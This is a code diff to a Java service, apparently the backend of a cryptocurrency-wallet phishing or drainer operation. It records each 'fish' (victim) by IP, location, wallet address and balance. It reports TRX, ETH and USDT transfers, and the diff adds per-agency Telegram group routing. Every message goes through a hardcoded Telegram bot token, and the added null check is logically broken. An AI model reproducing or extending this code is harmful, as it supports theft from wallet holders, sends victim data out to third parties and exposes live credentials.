@@ -4,9 +4,11 @@ import com.alibaba.fastjson2.JSONObject;
 import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
 import com.baomidou.mybatisplus.core.toolkit.Wrappers;
 import com.ruoyi.common.core.domain.AjaxResult;
+import com.ruoyi.tron.domain.OrgAccountInfo;
 import com.ruoyi.tron.domain.TronBillRecord;
 import com.ruoyi.tron.domain.TronFish;
 import com.ruoyi.tron.domain.TronTansferRecord;
+import com.ruoyi.tron.service.IOrgAccountInfoService;
 import com.ruoyi.tron.service.ITronBillRecordService;
 import com.ruoyi.tron.service.ITronFishService;
 import com.ruoyi.tron.service.ITronTansferRecordService;
@@ -38,6 +40,8 @@ public class Receiver {
     private ITronTansferRecordService iTronTansferRecordService;
     @Autowired
     private ITronFishService iTronFishService;
+    @Autowired
+    private IOrgAccountInfoService iOrgAccountInfoService;
 
 
     public void transferTRX(String message) throws Exception {
@@ -58,6 +62,12 @@ public class Receiver {
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
 
         //发送USDT_TRC20转账消息
+        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
+        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
+        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
+        if (orgAccountInfo==null && orgAccountInfo.getTgbotGroupId()==null){
+            return;
+        }
         StringBuffer stringBuffer = new StringBuffer();
         stringBuffer.append("转账类型：" + "【TRX转账】\n");
         stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
@@ -65,7 +75,7 @@ public class Receiver {
         stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
         stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
 
-        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
         log.info("sendMsg-bot发送请求={}", url2);
 
         String result2 = restTemplate.getForObject(url2, String.class);
@@ -93,6 +103,12 @@ public class Receiver {
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
 
         //发送USDT_TRC20转账消息
+        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
+        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
+        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
+        if (orgAccountInfo==null && orgAccountInfo.getTgbotGroupId()==null){
+            return;
+        }
         StringBuffer stringBuffer = new StringBuffer();
         stringBuffer.append("转账类型：" + "【ETH转账】\n");
         stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
@@ -100,7 +116,7 @@ public class Receiver {
         stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
         stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
 
-        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
         log.info("sendMsg-bot发送请求={}", url2);
 
         String result2 = restTemplate.getForObject(url2, String.class);
@@ -129,6 +145,12 @@ public class Receiver {
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
 
         //发送USDT_TRC20转账消息
+        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
+        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
+        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
+        if (orgAccountInfo==null && orgAccountInfo.getTgbotGroupId()==null){
+            return;
+        }
         StringBuffer stringBuffer = new StringBuffer();
         stringBuffer.append("转账类型：" + "【USDT_TRC20转账】\n");
         stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
@@ -136,7 +158,7 @@ public class Receiver {
         stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
         stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
 
-        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
         log.info("sendMsg-bot发送请求={}", url2);
 
         String result2 = restTemplate.getForObject(url2, String.class);
@@ -165,6 +187,12 @@ public class Receiver {
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
 
         //发送USDT_TRC20转账消息
+        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
+        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
+        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
+        if (orgAccountInfo==null && orgAccountInfo.getTgbotGroupId()==null){
+            return;
+        }
         StringBuffer stringBuffer = new StringBuffer();
         stringBuffer.append("转账类型：" + "【USDT_ERC20转账】\n");
         stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
@@ -172,7 +200,7 @@ public class Receiver {
         stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
         stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
 
-        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
         log.info("sendMsg-bot发送请求={}", url2);
 
         String result2 = restTemplate.getForObject(url2, String.class);
@@ -410,6 +438,12 @@ public class Receiver {
         fish.setArea(addr);
         iTronFishService.saveOrUpdate(fish);
 
+        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
+        lqw.eq(OrgAccountInfo::getAgencyId, fish.getAgencyId());
+        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
+        if (orgAccountInfo==null && orgAccountInfo.getTgbotGroupId()==null){
+            return;
+        }
         StringBuffer stringBuffer = new StringBuffer();
         stringBuffer.append("鱼苗IP：" + addr + "【" + fish.getIp() + "】\n");
         stringBuffer.append("鱼苗信息：" + fish.getAddress() + "\n");
@@ -426,7 +460,7 @@ public class Receiver {
         }
         stringBuffer.append("鱼苗余额：" + info + "\n");
 
-        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
         log.info("sendMsg-bot发送请求={}", url2);
 
         String result2 = restTemplate.getForObject(url2, String.class);
